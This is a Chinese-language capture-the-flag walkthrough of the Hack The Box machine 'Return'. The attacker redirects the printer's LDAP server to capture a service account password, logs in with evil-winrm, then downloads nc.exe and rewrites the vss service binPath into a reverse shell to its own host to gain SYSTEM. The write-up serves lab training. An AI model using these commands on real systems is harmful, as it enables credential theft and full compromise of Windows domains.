# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb/return]
└─# nmap -sV -Pn 10.10.11.108 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-27 22:40 EST
Nmap scan report for 10.10.11.108
Host is up (0.34s latency).
Not shown: 65508 closed ports
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-28 04:22:19Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        .NET Message Framing
22752/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49682/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     msrpc         Microsoft Windows RPC
54599/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1426.09 seconds

```
可以看见开启了很多服务，http，SMB，ldap等

enum4linux没有发现可以匿名登录的分享文件夹

目录爆破没有可以利用的信息

## 活动目录

浏览器打开80端口服务，首页是一个打印机的展示页面

打开```settings```页面，展示了一个打印机的设置页。

我们用以下关键字
> ldap windows printer 389 exploit

在谷歌找到了[这篇文章](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

留意这段话：
>To exploit this weakness, we simply need to reconfigure the MFP to use a different IP address for the LDAP server. Obviously, the selected IP address needs to be under our control and listening on port 389 (unsecured LDAP). When the MFP eventually makes an LDAP query, it should transmit the credentials back to us in plaintext.

当把```Server Address```字段换成一个我们可以控制的机器，ldap服务就会以明文返回一个管理密码

我们在```settings```页面，把```Server Address```改成```10.10.14.15```(就是tun0的地址)

同时，在我们的kali开启一个389端口的监听

点击```update```

收到ldap给我们的返回：
```
┌──(root💀kali)-[~/htb/return]
└─# nc -lnvp 389                
listening on [any] 389 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.108] 63337
0*`%return\svc-printer�
                       1edFg43012!!

```
```svc-printer```是账户信息

```1edFg43012!!```就是管理密码

用evil-winrm连接，拿到初始shell
```
┌──(root💀kali)-[~/htb/return]
└─# evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'                                                                                                                                                                         1 ⨯

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer

```

# 提权

查看本账号权限：
```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

查看本账号信息：
```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/30/2021 8:10:04 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```

留意我们在```Server Operators```组中，因此 我们拥有修改服务配置，重启服务的权限

把nc从kali下载到靶机：

> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/nc.exe','C:\Users\svc-printer\desktop\nc.exe')"

修改vss服务的二进制文件路径
> sc.exe config vss binPath="C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.14.15 4242"


与此同时在kali开启监听端口4242
> nc -lnvp 4242

重启vss服务

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\desktop> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


```

拿到system的反弹shell

```
┌──(root💀kali)-[~/htb/return]
└─# nc -lvnp 4242                                                                                                                                                                                                                       1 ⨯
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.108] 61869
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

